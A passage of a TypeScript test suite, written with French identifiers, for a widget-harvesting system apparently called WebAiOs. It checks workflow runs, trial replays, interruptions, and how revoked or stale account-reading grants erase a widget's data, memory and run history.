        await retirerAccord(ctx.dossierWidgets, "daily");
        await supprimerDonnees(ctx.dossierWidgets, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await recolter(ctx, { pont, ia: faux });
    expect(appelsLecture(pont)).toHaveLength(1);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
    const accueil = await lireAccueil(cheminsEspace(ctx.espace), ctx.dossierWidgets);
    const lu = accueil.widgets.find((w) => w.id === "daily")!;
    expect("donnees" in lu && lu.donnees).toBeNull(); // what donnees_widget would return
  });
});

describe("executerRecolte, through the widget's workflow", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };
  const donneesDe = (ctx: Contexte) => join(ctx.dossierWidgets, ctx.widget.id);
  const executionDe = async (ctx: Contexte, id: string | undefined) => {
    expect(id).toBeTruthy();
    return (await lireExecution(donneesDe(ctx), id!))!;
  };
  /** Replaces recolte.mjs with a workflow.json (and its files). */
  async function enWorkflow(ctx: Contexte, workflow: unknown, fichiers: Record<string, string> = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), typeof workflow === "string" ? workflow : JSON.stringify(workflow));
    for (const [nom, texte] of Object.entries(fichiers)) await writeFile(join(ctx.widget.dossier, nom), texte);
  }
  const NOUVEAUX = {
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "id" } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
    ],
    liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
  };
  /** An old run and a memory, to check that they leave with the data. */
  async function traces(ctx: Contexte) {
    const ancienne: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: ctx.widget.id }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie", blocs: [],
    };
    await ecrireExecution(donneesDe(ctx), ancienne);
    await ecrireMemoire(donneesDe(ctx), { nouveaux: { type: "liste.nouveaux", valeur: ["secret"] } });
  }

  it("a widget with only recolte.mjs and an account runs as before: same data, same log, implicit run recolte → output", async () => {
    const ctx = await preparer(
      "gmail",
      `export default async (w) => {
        const p = await w.lirePage("https://app.daily.dev/", { compte: true });
        w.journal("courriels lus");
        return { texte: p.texte, prec: w.precedent, cfg: w.config, quand: w.maintenant };
      };`,
      sources,
    );
    await ecrireDonnees(ctx.dossierWidgets, "gmail", { ancien: true });
    await accorder(ctx.dossierWidgets, "gmail", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    const attendu = { texte: "articles", prec: { ancien: true }, cfg: { a: 1 }, quand: MAINTENANT.toISOString() };
    expect(r.etat).toMatchObject({ statut: "ok", derniereMaj: MAINTENANT.toISOString() });
    expect(r.donnees).toEqual(attendu);
    expect(await lireJson(join(ctx.dossierWidgets, "gmail", "donnees.json"))).toEqual(attendu);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "gmail");
    expect(etat.statut).toBe("ok");
    expect(etat.journal).toContain("courriels lus");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
    const e = await executionDe(ctx, r.execution);
    expect(e).toMatchObject({ statut: "reussie", declencheur: "planifiee", proprietaire: { type: "widget", id: "gmail" }, debut: MAINTENANT.toISOString() });
    expect(e.blocs.map((b) => [b.id, b.type, b.statut])).toEqual([["recolte", "code", "reussi"], ["sortie", "sortie", "reussi"]]);
    expect(e.blocs[0]!.journal).toContain("courriels lus");
    // An error thrown by this widget stays its own: never marked as the core's.
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), `export default async () => { throw new Error("Délai dépassé"); };`);
    const echec = await recolter(ctx);
    expect(echec.etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé" });
    expect(echec.etat.erreurNoyau).toBeUndefined();
    expect(await lireJson(join(ctx.dossierWidgets, "gmail", "donnees.json"))).toEqual(attendu);
    expect((await executionDe(ctx, echec.execution)).statut).toBe("echouee");
  });

  it("a workflow widget writes data, run and memory; the next harvest receives the memory", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const r1 = await recolter(ctx);
    expect(r1.etat.statut).toBe("ok");
    expect(r1.donnees).toEqual([{ id: 1 }, { id: 2 }]);
    expect(await lireJson(join(ctx.dossierWidgets, "flux", "donnees.json"))).toEqual([{ id: 1 }, { id: 2 }]);
    expect((await lireMemoire(donneesDe(ctx))).nouveaux?.type).toBe("liste.nouveaux");
    const e = await executionDe(ctx, r1.execution);
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "reussi", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => [{ id: 2 }, { id: 3 }];`);
    const r2 = await recolter(ctx);
    expect(r2.donnees).toEqual([{ id: 3 }]);
  });

  it("a run's memory is written under the widget's memory lock (the builder's erase lock)", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    let liberer!: () => void;
    const tenu = avecMemoire(donneesDe(ctx), () => new Promise<void>((r) => (liberer = r)));
    let finie = false;
    const r = recolter(ctx).then((x) => ((finie = true), x));
    const donnees = join(donneesDe(ctx), "donnees.json");
    for (let i = 0; i < 200 && !existsSync(donnees); i++) await new Promise((t) => setTimeout(t, 25));
    expect(existsSync(donnees)).toBe(true);
    await new Promise((t) => setTimeout(t, 100));
    expect(finie).toBe(false);
    expect(existsSync(join(donneesDe(ctx), "memoire.json"))).toBe(false);
    liberer();
    await tenu;
    expect((await r).etat.statut).toBe("ok");
    expect((await lireMemoire(donneesDe(ctx))).nouveaux?.type).toBe("liste.nouveaux");
  });

  it("an invalid workflow.json: error state « Workflow invalide : … » marked erreurNoyau, data kept, no container launched, failed run written", async () => {
    for (const workflow of ['{"version":1,"blocs":[', { version: 1, blocs: [{ id: "x", type: "inconnu" }] }]) {
      const ctx = await preparer("casse", "");
      await enWorkflow(ctx, workflow);
      await ecrireDonnees(ctx.dossierWidgets, "casse", { ancien: true });
      const r = await recolter(ctx);
      expect(r.etat.statut).toBe("erreur");
      expect(r.etat.erreur).toMatch(/^Workflow invalide : /);
      expect(r.etat.erreurNoyau).toBe(true);
      expect(erreurDuNoyau(r.etat.erreur!)).toBe(true);
      expect(ctx.commandes).toHaveLength(0);
      expect(await lireJson(join(ctx.dossierWidgets, "casse", "donnees.json"))).toEqual({ ancien: true });
      const e = await executionDe(ctx, r.execution);
      expect(e).toMatchObject({ statut: "echouee", erreurNoyau: true, blocs: [] });
      expect(e.erreur).toBe(r.etat.erreur);
    }
  });

  it("the workflow is validated according to the widget: budgetSecondes 600 refused without a maximum duration, accepted with dureeMaxMinutes 30", async () => {
    const LONG = {
      version: 1,
      blocs: [
        { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
        { id: "page", type: "source.page", parametres: { url: "https://app.daily.dev/", parElement: true, budgetSecondes: 600 } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "liste", vers: "page" }, { de: "page", vers: "sortie" }],
    };
    const fichiers = { "liste.mjs": "export default () => [{ id: 1 }];" };
    const court = await preparer("court", "");
    await enWorkflow(court, LONG, fichiers);
    const refuse = await recolter(court, { pont: pontLecture() });
    expect(refuse.etat.erreur).toBe("Workflow invalide : page.budgetSecondes : 170 au plus");
    expect(court.commandes).toHaveLength(0);

    const long = await preparer("long", "");
    long.widget.declaration.recolte = { minutes: 60, dureeMaxMinutes: 30 };
    await enWorkflow(long, LONG, fichiers);
    const r = await recolter(long, { pont: pontLecture() });
    expect(long.commandes).toHaveLength(1);
    expect(r.etat.statut).toBe("ok");
  });

  it("grant removed during the run: no data, no run, no memory on disk at the end", async () => {
    const ctx = await preparer("daily", "", sources);
    await enWorkflow(ctx, NOUVEAUX, {
      "liste.mjs": `export default async (e, w) => [{ id: (await w.lirePage("https://app.daily.dev/", { compte: true })).texte }];`,
    });
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const lire = pont.lirePageInvisible!.bind(pont);
    // What refuserAccord does, during the read: the page read still reaches the widget.
    pont.lirePageInvisible = async (...a: Parameters<typeof lire>) => {
      await retirerAccord(ctx.dossierWidgets, "daily");
      await supprimerDonnees(ctx.dossierWidgets, "daily");
      return lire(...a);
    };
    const r = await recolter(ctx, { pont });
    expect(appelsLecture(pont)).toHaveLength(1);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(r.execution).toBeUndefined();
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
  });

  it("profile refused: data, runs and memory erased", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await traces(ctx);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    const r = await recolter(ctx, { pont: pontLecture(["prive"]) });
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: PROFIL_REFUSE, erreurNoyau: true });
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
  });

  it("stale grant (declaration changed): runs and memory erased along with the data", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await traces(ctx);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("accord-requis");
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    // Only the « accord requis » run of this time remains.
    expect((await listerExecutions(donneesDe(ctx))).map((e) => [e.id, e.statut])).toEqual([[r.execution, "accord-requis"]]);
  });

  it("without a grant: accord-requis run, no block launched", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await recolter(ctx);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect(ctx.commandes).toHaveLength(0);
    const e = await executionDe(ctx, r.execution);
    expect(e).toMatchObject({ statut: "accord-requis", erreurNoyau: true, erreur: r.etat.erreur });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "pas-lance"], ["sortie", "pas-lance"]]);
  });

  it("without a grant, again: no new accord-requis run, the last one stands in", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const premiere = await recolter(ctx);
    // An hour later: without the rule, a second run (other id) would be written.
    const plusTard = () => new Date(MAINTENANT.getTime() + 3_600_000);
    const seconde = await executerRecolte({ ...optionsDe(ctx), horloge: plusTard });
    expect(seconde.etat.statut).toBe("accord-requis");
    expect(seconde.execution).toBe(premiere.execution);
    expect((await listerExecutions(donneesDe(ctx))).map((e) => e.statut)).toEqual(["accord-requis"]);
  });

  it("the run carries the requested trigger", async () => {
    const ctx = await preparer("meteo", `export default async () => 1;`);
    const r = await executerRecolte({ ...optionsDe(ctx), declencheur: "agent" });
    expect((await executionDe(ctx, r.execution)).declencheur).toBe("agent");
    const m = await executerRecolte({ ...optionsDe(ctx), declencheur: "manuelle" });
    expect((await executionDe(ctx, m.execution)).declencheur).toBe("manuelle");
  });

  it("interrupted at the end: interrupted run", async () => {
    const ctx = await preparer("lent", `export default () => new Promise(() => {});`);
    const r = await executerRecolte({ ...optionsDe(ctx), delaiMs: 300, interrompue: () => true });
    const e = await executionDe(ctx, r.execution);
    // The message is the core's (not « Délai dépassé »); the started block is interrupted, the output never launched.
    expect(e).toMatchObject({ statut: "interrompue", erreur: "Interrompue : WebAiOs s'est arrêté", erreurNoyau: true });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "interrompu"], ["sortie", "pas-lance"]]);
    expect(erreurDuNoyau(e.erreur!)).toBe(true);
  });
});

describe("executerEssai", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };
  const donneesDe = (ctx: Contexte) => join(ctx.dossierWidgets, ctx.widget.id);
  async function enWorkflow(ctx: Contexte, workflow: unknown, fichiers: Record<string, string> = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), JSON.stringify(workflow));
    for (const [nom, texte] of Object.entries(fichiers)) await writeFile(join(ctx.widget.dossier, nom), texte);
  }
  const NOUVEAUX = {
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "id" } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
    ],
    liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
  };
  /** Content and modification date of the files kept outside the space (absent: null). */
  const instantane = async (ctx: Contexte) => {
    const r: Record<string, { texte: string; mtime: number } | null> = {};
    for (const nom of ["donnees.json", "memoire.json", "etat.json"]) {
      const chemin = join(donneesDe(ctx), nom);
      r[nom] = existsSync(chemin) ? { texte: await readFile(chemin, "utf8"), mtime: (await stat(chemin)).mtimeMs } : null;
    }
    return r;
  };
  const essai = (ctx: Contexte, origine: string, depart: string, o: Partial<Parameters<typeof executerEssai>[0]> = {}) =>
    executerEssai({ ...optionsDe(ctx), origine, depart, ...o });

  it("a trial writes a -essai run with depart and origine, and touches neither data, memory nor state", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    expect(reel.etat.statut).toBe("ok");
    expect((await lireMemoire(donneesDe(ctx))).nouveaux).toBeDefined();
    const avant = await instantane(ctx);
    expect(Object.values(avant).every((f) => f !== null)).toBe(true);
    // The list is not rerun: its output is taken from the original run.
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const traces: unknown[] = [];
    const r = await essai(ctx, reel.execution!, "nouveaux", { surTrace: (t) => traces.push(t) });
    expect(r).toEqual({ ok: true, execution: idEssai(MAINTENANT.toISOString()), statut: "reussie" });
    const e = (await lireExecution(donneesDe(ctx), (r as { execution: string }).execution))!;
    expect(e).toMatchObject({ declencheur: "rejeu", essai: { depart: "nouveaux", origine: reel.execution }, statut: "reussie" });
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "repris", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    expect(traces).toEqual([
      { bloc: "nouveaux", etape: "debut" },
      { bloc: "nouveaux", etape: "fin", statut: "reussi", elements: 2 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 2 },
    ]);
    expect(await instantane(ctx)).toEqual(avant);
    // The real run is still there, next to the trial.
    expect((await listerExecutions(donneesDe(ctx))).map((x) => x.id).sort()).toEqual([reel.execution, e.id].sort());
  });

  it("rejouer twice from the same block: the second trial starts from the first and takes the outputs of the real run", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const premier = await essai(ctx, reel.execution!, "nouveaux");
    if (!premier.ok) throw new Error(premier.erreur);
    const plusTard = new Date(MAINTENANT.getTime() + 60_000);
    const second = await essai(ctx, premier.execution, "nouveaux", { horloge: () => plusTard });
    expect(second).toEqual({ ok: true, execution: idEssai(plusTard.toISOString()), statut: "reussie" });
    const e = (await lireExecution(donneesDe(ctx), idEssai(plusTard.toISOString())))!;
    // The named origin is the one the reused output comes from: the real run.
    expect(e.essai).toEqual({ depart: "nouveaux", origine: reel.execution });
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "repris", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    // Real run pruned: the refusal stays that of a missing output.
    await rm(join(donneesDe(ctx), "executions", `${reel.execution}.json`));
    expect(await essai(ctx, premier.execution, "nouveaux", { horloge: () => new Date(plusTard.getTime() + 60_000) })).toEqual({
      ok: false, erreur: "Rejeu impossible : la sortie de « liste » manque dans cette exécution",
    });
  });

  it("a failing trial writes no error in the widget's state", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    const avant = await instantane(ctx);
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("boum"); };`);
    const r = await essai(ctx, reel.execution!, "liste");
    expect(r).toMatchObject({ ok: true, statut: "echouee" });
    expect(await instantane(ctx)).toEqual(avant);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "flux");
    expect(etat.statut).toBe("ok");
    expect(etat.erreur).toBeUndefined();
  });

  it("trial of a widget with an account without a grant: refused with the grant message, no container, nothing written", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await essai(ctx, "2026-10-27T08-00-00-000Z", "recolte");
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commandes).toHaveLength(0);
    expect(existsSync(donneesDe(ctx))).toBe(false);
  });

  it("grant removed during the trial: no run on disk", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => { const p = await w.lirePage("https://app.daily.dev/", { compte: true }); await w.kev("x", {}); return p.texte; };`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const faux = { kev: async () => ({}), gemma: async () => "" };
    const reel = await executerRecolte({ ...optionsDe(ctx), ia: faux });
    expect(reel.etat.statut).toBe("ok");
    // What refuserAccord does, during the trial.
    const retirer = {
      kev: async () => {
        await retirerAccord(ctx.dossierWidgets, "daily");
        await supprimerDonnees(ctx.dossierWidgets, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await essai(ctx, reel.execution!, "recolte", { ia: retirer });
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect(existsSync(join(donneesDe(ctx), "donnees.json"))).toBe(false);
  });

  it("trial refused by the replay plan: exact message, no container launched", async () => {
    const ctx = await preparer("flux", "");
    await enWorkflow(ctx, NOUVEAUX, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const reel = await executerRecolte(optionsDe(ctx));
    const lances = ctx.commandes.length;
    const avant = await instantane(ctx);
    expect(await essai(ctx, reel.execution!, "absent")).toEqual({ ok: false, erreur: "Rejeu impossible : le bloc « absent » n'est pas dans le workflow" });
    expect(await essai(ctx, "2020-01-01T00-00-00-000Z", "liste")).toEqual({ ok: false, erreur: "Rejeu impossible : exécution introuvable" });
    expect(ctx.commandes).toHaveLength(lances);
    expect(await instantane(ctx)).toEqual(avant);
    expect(await listerExecutions(donneesDe(ctx))).toHaveLength(1);
  });

  it("trial whose reused outputs and previous one exceed 4 MB: refused, no container, nothing written", async () => {
    const ctx = await preparer("gros", "");
    const amont = Array.from({ length: 10 }, (_, i) => `a${i}`);
    await enWorkflow(ctx, {
      version: 1,
      blocs: [
        ...amont.map((id) => ({ id, type: "code", parametres: { source: "a.mjs" } })),
        { id: "tout", type: "code", parametres: { source: "a.mjs" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [...amont.map((de) => ({ de, vers: "tout" })), { de: "tout", vers: "sortie" }],
    }, { "a.mjs": `export default async () => 1;` });
    await ecrireDonnees(ctx.dossierWidgets, "gros", "x".repeat(1_900_000));
    const origine: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: "gros" }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie",
      blocs: amont.map((id) => ({ id, type: "code", statut: "reussi" as const, debut: null, fin: null, elements: null, sortie: "y".repeat(240_000), journal: [] })),
    };
    await ecrireExecution(donneesDe(ctx), origine);
    const r = await essai(ctx, origine.id, "tout");
    expect(r).toEqual({ ok: false, erreur: "Rejeu impossible : les sorties à reprendre dépassent 4 Mo" });
    expect(ctx.commandes).toHaveLength(0);
    expect((await listerExecutions(donneesDe(ctx))).map((e) => e.id)).toEqual([origine.id]);
  });

  it("a widget without workflow.json (recolte.mjs alone): rejouer from the output takes the recolte output", async () => {
    const ctx = await preparer("gmail", `export default async (w) => ({ texte: (await w.lirePage("https://app.daily.dev/", { compte: true })).texte });`, sources);
    await accorder(ctx.dossierWidgets, "gmail", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const reel = await executerRecolte({ ...optionsDe(ctx), pont });
    expect(reel.etat.statut).toBe("ok");
    const avant = await instantane(ctx);
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const r = await essai(ctx, reel.execution!, "sortie", { pont });
    expect(r).toMatchObject({ ok: true, statut: "reussie" });
    const e = (await lireExecution(donneesDe(ctx), (r as { execution: string }).execution))!;
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "repris"], ["sortie", "reussi"]]);
    expect(appelsLecture(pont)).toHaveLength(1);
    expect(await instantane(ctx)).toEqual(avant);
    expect(existsSync(join(ctx.widget.dossier, "workflow.json"))).toBe(false);
  });

  it("stale grant at the start of a trial: grant removed, data erased, state accord-requis reported, no container", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    const etat = { statut: "ok" as const, derniereMaj: "2026-10-27T08:00:00.000Z", derniereTentative: "2026-10-27T08:00:00.000Z" };
    await ecrireEtatWidget(ctx.dossierWidgets, "daily", etat);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const surChange = vi.fn();
    const r = await essai(ctx, "2026-10-27T08-00-00-000Z", "recolte", { surChange });
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commandes).toHaveLength(0);
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(donneesDe(ctx), "donnees.json"))).toBe(false);
    expect(await lireEtatWidget(ctx.dossierWidgets, "daily")).toEqual({
      ...etat,
      statut: "accord-requis",
      erreur: "Accord requis pour lire avec ton compte : app.daily.dev",
      erreurNoyau: true,
    });
    expect(surChange).toHaveBeenCalled();
  });

  it("profile refused during the trial: no run, grant removed, state accord-requis", async () => {
    const ctx = await preparer("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const reel = await executerRecolte(optionsDe(ctx));
    expect(reel.etat.statut).toBe("ok");
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    const surChange = vi.fn();
    const r = await essai(ctx, reel.execution!, "recolte", { pont: pontLecture(["prive"]), surChange });
    expect(r).toEqual({ ok: false, erreur: PROFIL_REFUSE });
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(donneesDe(ctx), "donnees.json"))).toBe(false);
    expect(await lireEtatWidget(ctx.dossierWidgets, "daily")).toMatchObject({
      statut: "accord-requis",
      erreur: PROFIL_REFUSE,
      erreurNoyau: true,
      derniereMaj: reel.etat.derniereMaj,
      derniereTentative: reel.etat.derniereTentative,
    });
    expect(surChange).toHaveBeenCalled();
  });

  it("interrupted during the trial: -essai run interrupted, neither data, memory nor state touched", async () => {
    const ctx = await preparer("lent", `export default () => new Promise(() => {});`);
    await ecrireDonnees(ctx.dossierWidgets, "lent", { ancien: true });
    await ecrireEtatWidget(ctx.dossierWidgets, "lent", { statut: "ok", derniereMaj: "2026-10-27T08:00:00.000Z", derniereTentative: "2026-10-27T08:00:00.000Z" });
    const origine: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: "lent" }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie", blocs: [],
    };
    await ecrireExecution(donneesDe(ctx), origine);
    const avant = await instantane(ctx);
    const r = await essai(ctx, origine.id, "recolte", { delaiMs: 300, interrompue: () => true });
    expect(r).toEqual({ ok: true, execution: idEssai(MAINTENANT.toISOString()), statut: "interrompue" });
    const e = (await lireExecution(donneesDe(ctx), idEssai(MAINTENANT.toISOString())))!;
    expect(e).toMatchObject({ statut: "interrompue", erreur: "Interrompue : WebAiOs s'est arrêté", erreurNoyau: true });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "interrompu"], ["sortie", "pas-lance"]]);
    expect(await instantane(ctx)).toEqual(avant);
  });

  it("without a grant: a more recent trial does not prevent the last accord-requis run from standing in", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const premiere = await executerRecolte(optionsDe(ctx));
    expect(premiere.etat.statut).toBe("accord-requis");
    const essaiEcrit: Execution = {
      version: 1, id: "2026-10-28T11-00-00-000Z-essai", proprietaire: { type: "widget", id: "daily" }, declencheur: "rejeu",
      essai: { depart: "recolte", origine: premiere.execution! },
      debut: "2026-10-28T11:00:00.000Z", fin: "2026-10-28T11:00:01.000Z", statut: "echouee", blocs: [],
    };
    await ecrireExecution(donneesDe(ctx), essaiEcrit);
    const plusTard = () => new Date(MAINTENANT.getTime() + 2 * 3_600_000);
    const seconde = await executerRecolte({ ...optionsDe(ctx), horloge: plusTard });
    expect(seconde.execution).toBe(premiere.execution);
    expect((await listerExecutions(donneesDe(ctx))).filter((e) => !e.essai)).toHaveLength(1);
  });
});

describe("executerRecolte, watch (publications as it goes, memory kept, novelties)", () => {
  const donneesDe = (ctx: Contexte) => join(ctx.dossierWidgets, ctx.widget.id);
  const fichierDonnees = (ctx: Contexte) => join(donneesDe(ctx), "donnees.json");
  const fichierMemoire = (ctx: Contexte) => join(donneesDe(ctx), "memoire.json");
  /** list (code) → record (source.recuperer per element) → output. */
  const veille = (o: { auFilDeLEau?: boolean } = {}) => ({
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "fiche", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget", ...(o.auFilDeLEau ? { auFilDeLEau: true } : {}) } },
    ],
    liens: [{ de: "liste", vers: "fiche" }, { de: "fiche", vers: "sortie" }],
  });
  async function enVeille(ctx: Contexte, o: { auFilDeLEau?: boolean; dureeMaxMinutes?: number } = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), JSON.stringify(veille(o)));
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), "export default () => [];");
    if (o.dureeMaxMinutes !== undefined) ctx.widget.declaration.recolte = { minutes: 60, dureeMaxMinutes: o.dureeMaxMinutes };
  }

  /**
   * A fake container that writes its lines one by one; a function (possibly async) is called instead
   * of a line. `recu`: what the core writes to it; `bloque`: it never exits on its own (only killed).
   */
  const lanceurPas = (ctx: Contexte, pas: unknown[], o: { recu?: string[]; bloque?: boolean } = {}): LanceurProcessus => (cmd, args) => {
    ctx.commandes.push([cmd, ...args]);
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let tuer = () => {};
